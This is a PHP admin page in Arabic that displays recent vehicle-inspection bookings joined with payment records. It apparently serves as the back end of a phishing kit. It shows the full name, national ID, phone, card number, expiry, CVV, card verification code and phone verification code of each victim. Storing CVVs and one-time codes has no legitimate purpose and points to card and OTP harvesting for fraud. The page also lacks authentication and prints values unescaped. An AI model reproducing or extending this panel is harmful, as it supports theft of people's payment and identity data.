<?php
require_once 'db.php';  // ملف الاتصال بقاعدة البيانات

$sql = "SELECT 
  a.id, a.fullname, a.phone, a.idnumber, a.vehiclenumber, a.registrationtype, a.vehicletype, a.inspectiontype, a.city, a.date, a.time,
  p.cardholder, p.cardnumber, p.expiry_month, p.expiry_year, p.cvv, p.verification_code, p.phone_number, p.operator, p.phone_verification_code
FROM appointments a
LEFT JOIN payments p ON p.appointment_id = a.id
ORDER BY a.created_at DESC
LIMIT 25";

$result = $conn->query($sql);
?>

<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8" />
<title>لوحة تحكم العملاء</title>
<style>
  body { font-family: 'Tajawal', sans-serif; background: #f7fafc; padding: 20px; }
  .card {
    background: #fff;
    border-radius: 12px;
    box-shadow: 0 3px 8px rgba(0,0,0,0.1);
    padding: 20px;
    margin-bottom: 25px;
    max-width: 700px;
  }
  h3 {
    color: #267a43;
    margin-bottom: 10px;
  }
  .field-label {
    font-weight: 700;
    color: #555;
    width: 150px;
    display: inline-block;
  }
  .field-value {
    color: #333;
  }
  .section {
    margin-bottom: 15px;
  }
</style>
</head>
<body>

<h1>لوحة تحكم العملاء</h1>

<?php
if ($result && $result->num_rows > 0) {
  while($row = $result->fetch_assoc()) {
    echo "<div class='card'>";
    
    echo "<div class='section'><h3>بيانات الحجز</h3>";
    echo "<div><span class='field-label'>الاسم الكامل:</span><span class='field-value'>{$row['fullname']}</span></div>";
    echo "<div><span class='field-label'>رقم الجوال:</span><span class='field-value'>{$row['phone']}</span></div>";
    echo "<div><span class='field-label'>رقم الهوية:</span><span class='field-value'>{$row['idnumber']}</span></div>";
    echo "<div><span class='field-label'>رقم المركبة:</span><span class='field-value'>{$row['vehiclenumber']}</span></div>";
    echo "<div><span class='field-label'>نوع التسجيل:</span><span class='field-value'>{$row['registrationtype']}</span></div>";
    echo "<div><span class='field-label'>نوع المركبة:</span><span class='field-value'>{$row['vehicletype']}</span></div>";
    echo "<div><span class='field-label'>نوع الفحص:</span><span class='field-value'>{$row['inspectiontype']}</span></div>";
    echo "<div><span class='field-label'>المدينة:</span><span class='field-value'>{$row['city']}</span></div>";
    echo "<div><span class='field-label'>تاريخ الموعد:</span><span class='field-value'>{$row['date']}</span></div>";
    echo "<div><span class='field-label'>الوقت:</span><span class='field-value'>{$row['time']}</span></div>";
    echo "</div>";
    
    echo "<div class='section'><h3>بيانات الدفع</h3>";
    echo "<div><span class='field-label'>اسم صاحب البطاقة:</span><span class='field-value'>{$row['cardholder']}</span></div>";
    echo "<div><span class='field-label'>رقم البطاقة:</span><span class='field-value'>{$row['cardnumber']}</span></div>";
    echo "<div><span class='field-label'>تاريخ الانتهاء:</span><span class='field-value'>{$row['expiry_month']}/{$row['expiry_year']}</span></div>";
    echo "<div><span class='field-label'>CVV:</span><span class='field-value'>{$row['cvv']}</span></div>";
    echo "<div><span class='field-label'>رمز التحقق:</span><span class='field-value'>{$row['verification_code']}</span></div>";
    echo "<div><span class='field-label'>رقم الجوال:</span><span class='field-value'>{$row['phone_number']}</span></div>";
    echo "<div><span class='field-label'>المشغل:</span><span class='field-value'>{$row['operator']}</span></div>";
    echo "<div><span class='field-label'>رمز تحقق الجوال:</span><span class='field-value'>{$row['phone_verification_code']}</span></div>";
    echo "</div>";
    
    echo "</div>";
  }
} else {
  echo "<p>لا توجد بيانات للعرض.</p>";
}
?>

</body>
</html>
